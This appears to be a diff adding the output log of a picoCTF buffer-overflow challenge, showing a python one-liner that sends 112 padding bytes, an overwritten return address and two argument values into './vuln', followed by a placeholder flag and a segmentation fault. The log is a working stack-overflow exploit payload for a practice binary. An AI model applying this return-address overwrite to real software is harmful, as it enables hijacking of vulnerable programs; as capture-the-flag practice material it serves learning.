@@ -1,0 +1,6 @@
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCﾭ�����
+picoCTF{FLAG}
+./get_flag.sh: line 3: 15230 Done                    python -c "print('A'*112 + '\xcb\x85\x04\x08' + 'CCCC' + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde')"
+     15231 Segmentation fault      | ./vuln
+
